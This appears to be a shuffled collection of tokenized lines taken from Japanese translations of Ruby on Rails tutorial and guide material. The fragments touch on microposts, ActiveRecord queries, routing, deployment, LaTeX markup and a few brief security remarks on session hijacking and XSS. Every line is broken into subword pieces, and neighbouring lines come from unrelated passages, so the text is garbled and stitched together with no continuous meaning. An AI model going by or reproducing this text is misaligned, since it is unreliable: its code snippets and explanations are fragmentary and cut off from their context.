▁ マイクロポスト はその 名 のとおり 短い のですが 、\ k ode { string } 型の 上 限 が かなり 大 き い ので そこに 保存 すると かなり 余 ってしまいます ▟\ k ode { text } 型 なら もっと 手 頃 で 、 かつ 最大 長 を 必要に応じて 大きく することもできます 。
▁# => ▁< p >< code > : to _ param </ code ></ p >
▁\ section { 最後に } ▁% ▁( fold )╼ ▁\ label { sec : advance d _ login _ co nclusion }╼╼
▁以下の 変更 は 、 アプリケーションを Rails ▁4▖0 に アップグレード する ためのものです 。
▁この 機能 をオフに して I 18 n で すべての 種類の ロケール オプション を使用 できるように するには 、 以下のように 変更します 。
▁We ’ ll ▁see ▁the ▁technical ▁meaning ▁of ▁this ▁in ▁Section ▁\ ref { sec : a _ class _ of _ our _ own }, ▁but ▁I ▁don ’ t ▁think ▁any one ▁ever ▁under st ood ▁objects ▁by ▁reading ▁the ▁definition ▁in ▁a ▁book ; ▁you ▁have ▁to ▁build ▁up ▁your ▁in t u it ion ▁for ▁objects ▁by ▁see ing ▁lot s ▁of ▁examples ▖
▁\ k ode { user ▖ microposts } メソッドは デフォルトでは 読み出し の順序 に対して 何も 保 証 しません が 、 ▁ ブログ や Twitter の慣習 に従って 、 作成 時間 の 逆 順 、 つまり 最も 新しいマイクロポスト を 最初に 表示する ように してみましょう
▁ — Bo b ▁C a ve z z a ▁(\ emph { Rails ▁ チュートリアル } 読者 )
▁ここで 、 users _ path に POST リクエストを送信する ために 、\ k ode { post _ via _ redirect } という メソッドを使って いることに注目してください 。
▁ 論理値 は 、 特に \ emph { 処理 の 流れ を変更する } ときに 有用です 。
▁* ▁ ジョブ の作成 方法
▁ 経験 則 として 、` S o me Class ` という クラス があれば 、` active _ support / core _ ext / some _ class ` という パス を指定する ことで 一度 に 読み 込 め ます 。
▁ 永続的 な cookies には 、\ emph { セッションハイジャック } という 攻 撃 を受け る 可能性 が 常に つ き ま と います ▟ ユーザーの ブラウザ 上 に保存 される 情報 については 、\ ref { sec : remember _ me } で もう少し 注意 深 く 扱 う ことにします 。
▁| ▁| ▁20 6 ▁| ▁: partial _ content ▁|
▁* ▁` active _ support ▖ d eprecation _ be ha v i or `: ▁ 環境 に対する 非推奨 レポート 出力 を設定します ▟ development 環境で はデフォルトで `: log ` 、 production 環境で はデフォルトで `: notify ` 、 test 環境で はデフォルトで `: s td er r ` が 指定 されます 。
▁Ruby ▁on ▁Rails で バグ を見つけ たら 、 そこ から 貢献 を開始 できます 。
▁ 他にも 、 Active ▁Record インスタンス に 機能 を追加する カラム名 が いくつか あります 。
▁ 指定 できる 値は `: cookie _ store ` ( デフォルト ) 、`: me m _ cache _ store `、`: disabled ` です 。
▁この 記 法 を 毎 回 繰り返す のは 煩 雑 なので 、 たとえば ` create ` アクションと ` update ` アクション で 共 用 できるように この メソッドを く く り だ しておく のが普通です 。
▁Ruby ▁on ▁Rails ▁3▖2 ▁ チュートリアル
▁ 受 信 者 の メールアドレスを メール に そのまま 表示する の ではなく 、 受 信 者 の名前 で 表示 したい ことがあります 。
▁第 \ ref { cha : log _ in _ log _ out } 章では 、\ ref { sec : adding _ a _ secure _ password } の 認証システム を利用して 、 ユーザーが 実際に Web サイトに ログイン できるようにします 。
▁ 以前の モデルと は 違 って 、 今回の マイクロポスト モデル は 完全に テスト され 、 デフォルトの \ emph { 順序 } を 持ち 、 また 親 である ユーザーが 破棄され た場合 に は自動的に \ emph { 破 棄 } される ようにします 。
▁特定の属性にアクセスするための 、 種類 が " text " の input タグを返します 。
▁` nil ` でない 場合にのみ オブジェクトの メソッドを 呼び出し たい場合 、 最も 単純な 方法は 条件 文 を追加する ことです が 、 どこか 冗 長 になってしまいます 。
▁ ど な た でも Rails ガイド の 改 善 に 貢献 することができます ▟ Rails ガイド に 求 め られる 改 善 とは 、「 一 貫 している こと 」「 矛盾 が ないこと 」「 読みやすい こと 」「 情報 の 追加 」「 事 実 と 異 な っている 部分 の 修正 」「 タ イ ポ の 修正 」「 最新の ed ge ▁Rails に 追 い 付 く こと 」 など です 。
▁xml ▖ target (" name " ▁=> ▁" compile ", ▁" option " ▁=> ▁" fast ")
▁ 独自の バリデーション を定義する ために 、 今 まで 使って いた \ k ode { validates } メソッド ではなく 、\ k ode { validate } メソッドを 使 っ ている点に注目してください 。
▁#### ▁SQLite 3 データベース を設定する
▁ 中 継 点 ▁( コミット の 直 前 など ) ▁ に 到 達 したら 、 ▁ コマンドラインで \ k ode { rspec ▁ spec / } を実行して テストスイート をすべて 実行 し 、 成功 する ことを確認する 。
▁ Category ▖ includes ( articles : ▁[ { ▁comments : ▁: guest ▁ }, ▁: tags ]) ▖ find (1)
▁ アクションは 定義され ましたが 、 これ に 関連付けられた ビュー が ないので エラーが表示され ます 。
▁この節では 、 無効な データ 送信 を受け 付ける ユーザー登録フォーム を作成し 、 ユーザー登録フォーム を更新し て エラー の一覧を表示 します ▟ この モックアップ を 図 \ ref { fig : signup _ failure _ mockup } に示します 。
▁else
▁ プッシュ した Rails アプリケーションの リポジトリ を開いて ▁( ここでは https :// github ▖ com / your - user - name / rails ▁ に あるとします ) 、 右 ペ イン にある ▁[ P u ll ▁ Request s ] ▁ をクリックします 。
▁| ▁| ▁20 5 ▁| ▁: reset _ content ▁|
▁ CarrierWave に 画像 と 関連付け た モデルを 伝える ためには 、\ k ode { m o un t \_ uploader } という メソッド を使います ▟ このメソッドは 、 引数に 属性 名 の シンボル と 生成された アップ ロー ダ ー の クラス名 を 取り ます 。
▁ 特殊な ことを する ので なければ 、 これらの 予 約 済み カラム名 の使用 は 避 け てください 。
▁* ▁` limit `
▁name ▁var cha r ( 2 55 ),
▁ 一方で 、 許可 されていない ページ に対して アクセス する ログイン 済み の ユーザーが い たら ▁( たとえば 他 人 の ユーザー編集ページ にアクセス し ようとした ら ) 、 ルート URL に リダイレクト させる ようにします ▁(\ ref { sec : requiring _ the _ right _ user }) 。
▁production :
▁ マイグレーション の 後で た ま に Rake タスク が 実行 でき なく な ること があり 、 多くの 人 が これ に 戸惑 います 。
▁ 古 い バージョンの Rails から アップグレード する
▁{0}{1} 図 2▖1 4 {/1}{/0} に示した とおり 、 マイクロポスト の内容 が 長 すぎる という \ emph { エラーメッセージ } が Rails によって 表示されます
▁ 最も よく 使用される 名前空間 と い えば 、 多数の 管理 用 コントローラ 群 を まとめ る ` Admin :: ` 名前空間 でしょう 。
▁ ユーザー一覧ページ に ユーザーが 1 人 しか 表示 されていない
▁( リスト \ ref { code : sign _ in _ password _ resets } と 図 \ ref { fig : forgot _ password _ link } 参 照 )
▁Active ▁Record は 、 テーブルに 定義された すべての フィールド ▁( 属性 とも 呼 ば れ ます ) ▁ に対して 自動的に フ ァ イン ダ メソッド を提供します 。
▁つまり 、 以下のような テストは
▁`: prefix ` オプションを true に すると 、 生成された メソッド の名前 に プレフィックス を追加します 。
▁リスト \ ref { code : generate _ users _ controller } により 、\ k ode { new } アクション を持つ Users コントローラ ( リスト \ ref { code : initial _ users _ controller }) と 、 ス タブ のユーザー ビュー を作成します ( リスト \ ref { code : initial _ new _ action }) 。
▁# ▁ このような 処理を 数 千 件 もの レコード に対して 実行する と 、 効率 が 大 幅 に 低 下 します 。
▁ ログイン 後 、\ k ode { delete } メソッドで \ text tt { DELETE } リクエストを ログアウト 用 パス ▁( 表 \ ref { table : RESTful _ sessions }) ▁ に 発行し 、 ユーザーが ログアウト して ルート URL に リダイレクト された ことを確認します ▟ ログイン 用 リンク が 再度 表示される こと 、 ログアウト 用 リンク と プロフィール 用 リンク が 非 表示 になる ことも 確認し ます 。
▁TIP : ▁ ルーティング の詳細については [ Rails のルーティング ]( routing ▖ html ) を参照してください 。
▁ 将来 、 ユーザー 定義 の タイムゾーン が システム の タイムゾーン と 比 較 される こと があり えます ▟ システム の タイムゾーン で はデフォルトで ` Date ▖ today ` が使用されます 。
▁つまり 、1 人のユーザー は 「\ k ode { has _ many ▁: relationships }」 、 つまり 1 対 多 の関係 を持つ ことができ 、 さらに ユーザーは リレーションシップ \ emph { を経由して } 多くの \ k ode { followed _ users } ▁( または \ k ode { followers }) ▁ と 関係 を持つ ことができる ということです 。
▁という コードは 等 価 になります ▁( 一般的 には 省略 記 法 が 好 まれ ますが 、 明示的に 接 頭 に コロン を つ け て シンボル ▁(\ k ode { : name }) ▁ であること を 強 調 する という 考え 方 もあります ) 。
▁@ account ▁= ▁@ supplier ▖ account
▁resources ▁: comments , ▁only : ▁ [: show , ▁: edit , ▁: update , ▁: destroy ]
▁Client ▖ select (: id )▖ map ( & : id )
▁has _ and _ belongs _ to _ many ▁: assemblies , ▁-> ▁ { ▁group ▁" factory " ▁ }
▁-- no - test - framework
▁デフォルトでは 、 すべての ヘルパーは ビューで 使用できます が 、 コントローラ では 使用 可能 になって いません 。
▁TIP : ▁このメソッド で 取り 出 される レコード は 、 使用する データベース エンジン によって も 異なる ことがあります 。
▁name ▁L I K E ▁? ', ▁" % # { query } % "] )
▁作成した コードをリスト \ ref { code : dependent _ destroy _ test } に示します
▁d ist ance _ of _ time _ in _ words ( Time ▖ now , ▁Time ▖ now ▁+ ▁ 15 ▖ seconds , ▁include _ seconds : ▁true ) ▁# ▁=> ▁less ▁than ▁20 ▁second s
▁#### ▁` descendants `
▁ 解決 法 は いた って 単 純 です ▟ 1 つの コード 実行 パス 内で は 、` render ` メソッド や ` redirect ` メソッドの 実行 は 1 度 だけ に してください 。
▁ すなわち 、 有効な 情報を 送信 して 、 ユーザーが \ emph { 作成された } ことを確認します 。
▁Rake file
▁include ▁Blorgh :: Concern s :: Model s :: Article
▁` has _ many ` 関連付け が 使用されている 場合 、「 反 対 側 」 の モデル では ` belongs _ to ` が 使用される ことが 多く あります 。
▁上の 文字列 は 、 パスワード ▁(\ k ode {" foobar " }) ▁ を 暗号化 した もの であり 、 ユーザー オブジェクトを 初期化 するのに 使用 されました 。
▁#< User ▁id : ▁2, ▁name : ▁" A ▁N other ", ▁email : ▁" another @ example ▖ org ", ▁created _ at :
▁ データモデル を モデル ファイル の中に コメント として 残 しておく と 、 モデルに どんな 属性 がある か を 楽 に 思い 出 せ ます ▟ なお 簡潔 さ の ため 、 本書 で 今後 使用する コード には この 注 釈 を付け ません
▁ 優 先 される 値は 、 同じ ハッシュ が与えられ た場合 であっても 一 定 する 保 証 はありません 。
▁\ k ode { String } クラスの 継 承 階層
▁Rails は 出力 すべき ビューを 探 索 する 際に 、 アプリケーションの ` app / views ` ディレクトリ を 最初に 探 索 します 。
▁この 変更 は 、 ルーティング ファイルの \ k ode { resources } 行 で 行います ▁( リスト \ ref { code : account _ activations _ route }) 。
▁Rails ▁4▖1 の ` render ` に `: plain `、`: html `、`: body ` オプション が 導 入 されました 。
▁belongs _ to ▁: customer
▁“ following ” ▁ 関連の メソッド をテストする
▁invoke ▁ jbuilder _ scaffold _ controller
▁#### ▁ ミドルウェア を追加する
▁ 独自の SQL を使用して レコードを 検索 したい場合 、` find _ by _ sql ` メソッド を使用できます 。
▁\ k ode { Spork ▖ pre for k } ブロック への 環境 読み込み を追加する 。
▁ 他の 多くの 言語 による Web アプリケーション フレームワーク と 比 較 して 、 アプリケーション を作成する 際の コード 量 が より 少 なく て 済 む にもかかわらず 、 より 多くの 機能を 実現 できます 。
▁* ▁` update _ counter s `
▁ トピックブランチ を 分 け ておく ことで 、 チュートリアル 本 編 と の 食 い 違い を 避ける ことができます 。
▁最初に 、 モデルの 継 承 構造 について説明します 。
▁ { nil ▁=> ▁nil , ▁1 ▁=> ▁1, ▁nested : ▁ { a : ▁3 , ▁5 ▁=> ▁ 5}} ▖ deep _ transform _ keys ▁ { ▁| key | ▁key ▖ to _ s ▖ upcase ▁ }
▁ ネストした レイアウト ▁( サブ テンプレート と呼ばれる こともあります ) ▁ を使用することで 、 メ イン の レイアウト を 複 製 して 編集 したり せずに これを実現 できます 。
▁Home ページに footer を追加する
▁ 逆に GitHub の issue は 、 こうした 新しい アイディア のために 必要な 議 論 ▁( ときには 長 期 かつ 複 雑 になる ことも ある でしょう ) ▁ を行う ための 場所 ではありません 。
▁* ▁ 引数 を 2 つ 使用する ` asset - url ` は 非推奨 となり ました 。
▁| ▁POST ▁| ▁ / kategorien ▁| ▁categories # create ▁| ▁categories _ path ▁|
▁* ▁`: maximum ` ▁- ▁ 属性 はこの 値 より 大きな 値を 取 れ ません 。
▁# ▁active _ support / dependencies ▖ rb
▁これらの 課題 を 達 成 するには 、 もう少し 新しい テストの テクニック を 覚え る必要があります が 、 それ により テストスイート が 一 段 と 強 力 になります 。
▁| ▁| ▁10 2 ▁| ▁: process ing ▁|
▁たとえば 、` asset - url (" rails ▖ png ", ▁image ) ` は ` asset - url (" rails ▖ png ") ` と する必要があります 。
▁| ▁--------- ▁| ▁-------------- ▁| ▁- ---------------- ▁| ▁-------------- --------------- ---------------- ▁|
▁ 複数の フィールド を指定して 並 べ ることもできます 。
▁<%= ▁image _ tag ▁" header ▖ png " ▁%>
▁JSON ▁gem ▁API は 今後 正常に動作し ますが 、 その 代 わ り JSON ▁gem ▁API から Rails 特有の 機能 にアクセス することは でき なくなります 。
▁PATCH
▁$ ▁bundle ▁exec ▁rake ▁test : sqlite 3
▁array ▁# ▁=> ▁[ ' string ']
▁ BigDecimal ▖ new ( 5▖0 0, ▁6 )▖ to _ formatted _ s (" e ") ▁# ▁=> ▁" 0▖5 E 1 "
▁def ▁destroy
▁ 同様に 、2 つ目の 代入 「\ text tt {@ foo ▁|| ▁" baz "} 」( \ text tt {" bar " ▁|| ▁" baz "} など ) ▁ の 評価 値は \ text tt {" bar "} になります 。
▁ category ▖ articles ▖ published ▁# ▁=> ▁[ この カテゴリ に 属 する 、 公開 済み の 記事 ]
▁たとえば 、` I 18 n ▖ locale ▁= ▁: de ` と 設定 し 、` public / 5 00 ▖ de ▖ html ` と ` public / 4 04 ▖ de ▖ html ` を作成する ことで 、 ローカライズ 版 の レ ス キュー ページ を作成 できます 。
▁ 論 文 の 正 式 な タイトル : ▁ Fi el d ing , ▁R o y ▁ Thomas ▖
▁* ▁Rails アプリケーションの 原 型 を 素 早く 立 ち 上 げ る 方法
▁なお 、 この 置 換 え の つ い で に 、\ text tt { sqlite 3 } ▁gem を development 環境 と test 環境 ▁(\ ref { sec : rails _ environments }) ▁ だけ で使用する ▁( つまり production 環境では 使用 しない ) ▁ ように 変更 している 点 にも ご 注 目 ください ▟ これは 、 後で Heroku で使用する データベース と 競 合 する 可能性 を防ぐ ための 処 置 です ▁(\ ref { sec : deploying }) 。
▁この コントローラは 静的なページ を扱う ために しか 使わない ので 、 コントローラ 名を 「 Static ▁Pages 」 に 決 め 、 表 記 を \ href { https :// en ▖ w ikipedia ▖ org / wiki / CamelCase } { キャメルケース } の \ k ode { StaticPages } に します 。
▁### ▁ sprockets - rails
▁これは 特に production 環境で 有用です ▟ データベース接続 の パスワード のような 秘 密 情報を Git などの ソース コ ン ト ロー ル に 直接 登録 することは 避 け なければならない からです 。
▁ ス ニ ペ ッ ト の マークアップ が 複 雑 になる よう であれば 、 早 め に テンプレート ファイルに 移 行 すること を ご 検 討 ください 。
▁リスト \ ref { code : email _ downcase } では 、 次のように 代入 を していました が 、
▁\ ref { sec : requiring _ logged _ in _ users } と \ ref { sec : requiring _ the _ right _ user } と同じように 、 今回は before フィルター を使って \ k ode { destroy } アクション へのアクセス を 制御 します 。
▁static - pages
▁### ▁ リレーション に対する ミ ュ ー テ ー ター メソッド呼び出し
▁この 補 助 ファイルは 標準 の 一時 ファイル 用 ディレクトリに 書き 込 まれ ますが 、2 番目の 引数 で ディレクトリ を直接 指定することもできます 。
▁ そして 上の 方法 ( における 英語 の 記 述 ) は 、 Rails で 関連付けを 宣言 するために 使用される 文法 と 非常に 似 ています 。
▁$ ▁ subl ▁ ▖
▁このメソッドは 、 フルパス の ▁( qualified ) ▁ テーブル名 も 扱 えます 。
▁ これはリスト \ ref { code : generate _ micropost _ model } で使用されていました 。
▁class ▁As se mb ly ▁< ▁ActiveRecord :: Base
▁上のコードでは 、 ユーザー登録 後に サインイン している ことを確認する ために 、 サインアウト 用の リンク が表示されている かどうかを テスト しています 。
▁ delivery _ options ▁= ▁ { ▁user _ name : ▁ com p any ▖ smtp _ user ,
▁" B ackoffice :: UsersController "▖ deconstantize ▁# ▁=> ▁" B ackoffice "
▁"2010-07-27 ▁23:37:00 "▖ to _ time ▁# ▁=> ▁Tue ▁Ju l ▁ 27 ▁23:37:00 ▁UTC ▁2010
▁* ▁` d ec re ment _ counter `
▁{0} 図 11 ▖ 15 {/0} ▁{1} 新しいマイクロポスト を 作成した 直後 の Home ページ {/1}
▁これは 、` config ▖ action _ controller ▖ session _ store ` に 値が 設定 されている 場合にのみ 有効 です 。
▁ インデント 設定 を変更する には 、 右 上の 歯車 アイコン をクリックして ▁[ Code ▁ Edit or ▁( A ce ) ] ▁ を 選択 し 、[ S of t ▁T abs ] ▁ 設定 を開いて 編集 します ▁( 図 ▁\ ref { fig : cloud 9 _ two _ space s }) 。
▁ では 最初に 、 いつものように \ k ode { updating - users } トピックブランチを作成 しましょう 。
▁Rails ヘルパーは これ を使用して 、 マッピング リクエストが Sprockets へ 戻 される ことを 回 避 します 。
▁\ k ode { name : string } や \ k ode { email : string } オプション の パラメータを 渡す ことによって 、 データベース で使用した い 2 つの 属性を Rails に 伝 えます ▟ このとき に 、 これらの 属性 の 型 情報 も一緒に 渡します ▁( この場合は \ k ode { string }) 。
▁# ▁=> ▁#< Client ▁id : ▁1, ▁first _ name : ▁" Andy ", ▁orders _ count : ▁ 0, ▁ locked : ▁true , ▁created _ at : ▁"2011- 08 - 30 ▁06:09:27" , ▁updated _ at : ▁"2011- 08 - 30 ▁06:09:27" >
▁ 以前の Rails では 、 ビルトイン の ヘルパー に リンク されている すべての アセット に 日付 ベースの クエリ 文字列 を追加する という 戦 略 が使用され ていました 。
▁Heroku は 、 ソースコード の バージョン管理 に Git を使用し ていれば 、 Rails アプリケーション を簡単に 本番環境 に デプロイ できます
▁この アイディア に従って リスト \ ref { code : login _ create _ user _ instance } と リスト \ ref { code : i mprov ed _ remember _ me _ test } の 不 足 分 を 埋 め ▁( ヒント として \ k ode { ● } や \ k ode { FILL _ IN } を 目 印 に置い て あります ) 、[ remember ▁me ] ▁ チェックボックス のテスト を 改良 してください 。
▁ SELECT ▁articles ▖
▁has _ one ▁: account
▁` config / database ▖ yml ` ファイル の内容 が 空 で 、 かつ 環境変数 ` ENV [' DAT A BASE _ URL ']` が設定され ている 場合 、 データベース への 接続 には 環境変数 が使用されます 。
▁\ begin { equ ation }╼\ label { eq : time _ com p ar is on } ╼ t _ r ▁< ▁t _ e ▖
▁ そして いずれ か のバリデーション が 失敗する と 、` errors ` コレクション に 再び メッセージ が 格 納 されます 。
▁ セ レ ク タ 要素 ( つまり タグ ) は以下のように 指定します 。
▁もちろん 、 いずれ デフォルトの Rails ページ は 不要 になります が 、 アプリケーションが 動いている の を見 る のは 気 分 の い い ものです 。
▁ 特に XSS の場合 、 _ ブラックリスト ではなく ホワイトリスト に 基 づ いた 入力 フィルタ を 実 施 すること が 絶 対 重要です _ 。
▁{" development "=>{" adapt er "=>" postgresql ", ▁" host "=>" localhost ", ▁" database "=>" my _ database "} }
▁### ▁ フィンガープリント と 注意 点
▁ 比 較 的 小さい プロジェクト であっても テストスイート の実行 には 時間がかかる ため 、 テストを 一度 に 1 つだけ 実行 したり 、 小 規 模 な テスト グループ だけ を実行し たり できる のは 大きな 長 所 です 。
▁</ ul > 詳細については [ API ドキュメント ]( http :// api ▖ rubyonrails ▖ org / classes / ActionMailer / Base ▖ html ) を参照 。
▁Rails 関連の 書 籍 を 読んで い ると ▁“ REST ” ▁という 略 語 を よく 見 かけ ます ▟ これは RE presentational ▁ State ▁ Transfer の 略 です 。
▁@ assembly _ id s ▁= ▁@ part ▖ assembly _ id s
▁ 機能 追加 用の パッチ を 送信する 前に 自分の アイディア に 意 見 を 募 り たい場合は 、[ rails - core メ ー リ ング リスト ]( https :// groups ▖ google ▖ com / forum / ? from groups # ! forum / rubyonrails - core ) に メールを送信 してください ▟ もし 誰 から も 返 信 が なければ 、 自分の アイディア に 誰 も 関 心 を 持 って いない という ことがわかります 。
▁それでは 、 コンソール で 文字列 について 調 べ てみましょう ▟ 今回は \ k ode { rails ▁console } の代わりに 、 短縮 版 の \ k ode { rails ▁c } で コンソール を 起動 します 。
▁これは 、 HTTP 標準 では 技術 的に リダイレクト 後に 完全な URL が 要求 される ためです ▟ ただし 、 ほとんどの ブラウザで は どちらの 方法 でも 動作します 。
▁has _ and _ belongs _ to _ many 関連付けの 図 ]( images / ha b t m ▖ png )
▁{0}{1} 第 2 章 {/1}{/0} の演習 で 少し 触れ ましたが 、 name 属性 の存在 を 検 査 する方法 は 、 リスト { p 2 } に示した とおり 、 {3} validates {/3} メソッドに {3} presence : ▁true {/3} という 引数 を与え て 使う ことです 。
▁( Proc や Ruby の トピック としては や や 高度な 部 類 に含まれる ので 、 今 すぐ わ から なくても 心 配 する必要はありません ▟)
▁以下の例 で 考 察 してみましょう 。
▁ 現 実に このような 条件 が発生する 可能性 は かなり 低 く 、 この アプリケーション でも このような 条件 を 作り 出 さ ない ように 開発 している ので 、 本 来 は nil に設定する 必要はない のですが 、 ここでは セキュリティ上の 死角 を 万 が 一 に でも 作り 出 さ ない ために あえて nil に設定し ています 。
▁invoke ▁test _ unit
▁ 生の SQL を使用して データベースの レコード を検索する ことに 慣 れ き った 人 が Rails に 出 会 う と 、 Rails では 同じ 操作を ずっと 洗 練 された 方法で 実現 できる ことに気付く でしょう 。
▁now ▖ all _ week (: sunday )
▁#### ▁ MySQL データベース を設定する
▁以下の例 を参照 ください 。
▁ 現時点では 、 上の リスト \ ref { code : default _ controller _ test } の 文法 を い き なり 理解 する必要はありません ▟ 今は 「 この ファイル には テストが 2 つ 書かれてい る 」 ことを 認 識 して いた だけ れば 十分です ▟ その 2 つの テストは 、 リスト \ ref { code : generating _ pages } で生成した コントローラの 2 つの アクション である Home と Help に 対応 して 生成された ものです 。
▁ サンプルアプリケーションの レイアウト
▁つまり 、 ここでは 以下 をそのまま 使 えば よい だけ なのです 。
▁class ▁ Product ▁< ▁ActiveRecord :: Base
▁リスト \ ref { code : string _ shuffle } のコード にある 2 つの 疑問符 を 、 それぞれ 適切な メソッド に置き換え て 、 与えられた 文字列 の 文字 を シ ャ ッ フル する 関数 を作成してください ▟ ヒント : ▁\ k ode { split } メソッド 、\ k ode { shuffle } メソッド 、\ k ode { join } メソッドを 組み合わせ てみましょう 。
▁╼╼ This ▁is ▁the ▁first ▁application ▁for ▁the ╼[ * Ruby ▁on ▁Rails ▁Tutorial * ]( http :// www ▖ railstutorial ▖ org / )╼ by ▁[ Michael ▁Hartl ]( http :// www ▖ michael hartl ▖ com / )▖
▁ それ から 、 Ajax リクエストを 受 信 したときに \ k ode { create } アクションと \ k ode { destroy } アクション が 正常に 動作する ことを確認します
▁ ide ▁the ▁IDE ▁itself ▖ )╼╼ ▁\ subsection { ユーザー ページを 探 検 する } ▁% ▁( fold )╼ ▁\ label { sec : a _ user _ tour }╼╼
▁ ワ イ ル ド カ ー ド セグメント は ルーティング の どの 部分 で も使用できます 。
▁| vendor / | サードパーティ によって 書かれた コード はすべて ここに 置きます 。
▁さらに 、 現在 形 かつ 命 令 形で 書 いて お け ば 、 Git コマンド 自身 によって 生成される コミットメッセージ とも 時 制 が 整 合 します 。
▁ 連 鎖 した モジュール は 、 階層 の 下 から 上の 順に 配列 として 返 されます 。
▁class ▁ Employee ▁< ▁ActiveRecord :: Base
▁TIP : ▁ コミット が 複 数 に わ た っている 場合は 、 必ず ▁1 ▁ つの コミット に ス カ ッ シ ュ ( squash ) しておいてください 。
▁Rails は そのような 場合には 例外 を再 発生 させ なければなりません 。
▁ わ か り に く さ の 原 因 の一部 はこの 点 に あります ) 。
▁デフォルトは ` ' - ' ` で 、` <%= ▁- % >` または ` <%= ▁= % >` の 場合に 末 尾 スペース を削除し て 改行 します 。
▁ 特 権 を持つ 管理ユーザー を 識 別 するために 、 論理値 を と る \ k ode { admin } 属性を User モデル に追加します ▟ この後 で説明します が 、 こう すると 自動的に \ k ode { admin ?} メソッド ▁( 論理値 を返す ) ▁ も 使える ようになります ので 、 これ を使用して 管理ユーザー の状態 を テスト できます 。
▁Rails では 以下の 6 つの アセット タグ ヘルパー が 利用できます 。
▁ 理想 と する 最終的な プロファイル ページのモックアップ
▁# ▁1 回 あたり add _ invoices に 納 品 書 1 000 通 の配列 を 渡す
▁ メールを 配信 直前に 加 工 する
▁ それらの シンボル のうち 、`: controller ` と `: action ` は 特 別 です ▟ `: controller ` は アプリケーションの コントローラ への 割り当て を 行い 、`: action ` はその コントローラ の中に ある アクション への 割り当て を行います ▁( 訳 注 : ▁ 具体的な コントローラ 名 と アクション 名を 指定 していない 点にご注目ください ) 。
▁has _ many ▁: orders , ▁ dependent : ▁: destroy
▁まずは 、\ ref { sec : set ting _ the _ root _ route } で定義した Home ページ のルーティング について 見 直 し ていきましょう ▟ あのときは 特 別 に Home ページ のみ 設定 を しました が 、 残 り の 静的ページ について も同様に ルーティング を設定し ていきます 。
▁id = {0} 1 {/0} の ユーザーを 検索 できた のは 以上の 仕 組み による ものです ▁( リスト { p 1 }) 。
▁< strong > Comment er : </ strong >
▁ 条件 を ハッシュ で 渡す 場合 、 ハッシュの キー には 条件 付け したい フィールド を 、 ハッシュ の値 には その フィールド を どのように 条件 づ け するか を 、 それぞれ 指定します 。
▁この 定義 は 、 動的 セグメント として 指定 していない パラメータ に対して も 適用 されます 。
▁リスト \ ref { code : footer _ css } を 手 作業 で 変換 してみる ことは 、 良い 演習 になります ▟ 変換 後に も CSS が 適切に 動作 している ことを確認 してみましょう 。
▁ これはリスト \ ref { code : custom _ about _ page } で使用されていました 。
▁------------ ---------------- ----------------
▁しかし 索 引 のある 本 であれば 、 “ foobar ” を含む すべての ページを 索 引 の中から 探 す だけで済みます 。
▁### ▁Active ▁Record を設定する 。
▁Rails では 幸 い にも 、 この 属性を 指定 せずに \ k ode { image _ tag } を呼び出し た場合 は 、 画像 ファイル名 ▁( 拡張子 を 除 く ) ▁ を デフォルトの \ k ode { alt } 属性 として 自動的に 付 加 してくれます 。
▁この場合 、 “ a ▁user ▁visit s ▁the ▁signin ▁page ” という 記 述 は 以下のコード によって 実装 されます 。
▁ 先ほど のバリデーション とは異なり 、 ファイル サイズ に対する バリデーション は Rails の 既存の オプション ▁( presence や length など ) ▁ に はありません 。
▁これは \ k ode { : followers } 属性 の場合 、 Rails が ▁“ followers ” ▁ を 単数形 に して 自動的に 外部キー \ k ode { follower \_ id } を探し てくれる からです 。
▁ アプリケーションで の ログイン 成功 を 手動で 確認し たので 、 先 に進む前に 統合テスト を書いて この動作 を テストで 表現 し 、 今後 の 回 帰 バグ の 発生 を キャッチ できるように しましょう 。
▁create ▁db / migrate / [ timestamp ] _ create _ blorgh _ articles ▖ rb
▁上 で示した 警 告 には 、1 つ 小さな 問題 があります 。
▁( セッションハイジャック は 、 セキュリティ上の 注意 を 呼 び かけ るために これを 実 演 する \ href { http :// code but ler ▖ com / f iresheep } { F iresheep } アプリケーション によって 広 く 知 られる ようになりました ▟ F iresheep を使用すると 、 公 共 W i - Fi ネットワーク 経由で 接続 したときに 多くの 有 名 Web サイトの 記憶トークン が 丸 見え になっている ことがわかります 。
▁最初に ブラウザから の リクエスト を見てみましょう ▟ この リクエスト は 、 アドレス バー に URL を 入力 したり リンクを クリック した 時に 発生 します ▁( 図 \ ref { fig : mvc _ detailed } の 1 ) 。
▁(\ k ode { - u } フラグ については 気にする必要はありません ▟ 気 になる のであれば ▁" git ▁set ▁ upstream " で 検索 してみてください ) 。
▁ 表 \ ref { table : valid _ email _ regex } の 正規表現 の 説明 における 「 文字 」 は 、 実は 「 小文字 のみ 」 が 対象 になっている ことに注意してください ▟ ただし 、 正規表現 の 末尾に \ k ode { i } オプション を追加して あるので 、 大文字 小文字 が 区別 され ずに マッチする ようになっています 。
▁create ▁test / fixtures / microposts ▖ yml
▁` limit ` メソッドは 、 関連付け を使用して 取得 できる オブジェクトの 総 数を 制限 するのに 使用します 。
▁ この節 の変更は master ブランチ で 行う 必要があります 。
▁ { start _ date : ▁params [: start _ date ] , ▁end _ date : ▁params [: end _ date ] })
▁ ルーティング で ` redirect ` を使用すると 、 ある パス を 他の あらゆる パス に リダイレクト できます 。
▁# ▁Capybara を使用して いない 場合にも サインイン する 。
▁Rails で 表示 させた い 実際の ホームページ の 場所 を指定します 。
▁ 引数 で `: method ` を使用して HTTP 動詞 を指定することもできます 。
▁この ` welcome _ email ` メソッドは ` ActionMailer :: Message Delivery ` オブジェクトを 1 つ 返します ▟ この オブジェクトは 、 その メール 自身 が 送信 対象 であること を ` deliver _ now ` や ` deliver _ later ` に 伝 えます 。
▁ 定義 上 は 、 バリデーション 実行 後に コレクション が 空 になった 場合は 有効 です 。
▁ RDoc の 記 法 に 関 して は 、[ m ar k up ]( http :// docs ▖ s eattle rb ▖ org / rdoc / RDoc / M ar k up ▖ html ) を参照してください ( 訳 注 : ▁ 別 ページ ですが [ 日本語 の RDoc ライブラリ 解説 ]( http :// docs ▖ ruby - lang ▖ org / ja / 2▖1 ▖ 0 / library / rdoc ▖ html ) があります )▟ [ 追加 の ディレクティブ ]( http :// docs ▖ s eattle rb ▖ org / rdoc / RDoc / P ar s er / Ruby ▖ html ) にも 目 を通して おいてください 。
▁そこで ` try ` メソッド を使う という 手 があります ▟ ` try ` は ` Object # send ` と似ています が 、` nil ` に 送信された 場合には ` nil ` を返す 点 が異なります 。
▁ 改行 は 、 行 の 末 尾 と 次の 行 の 始 まり を示します 。
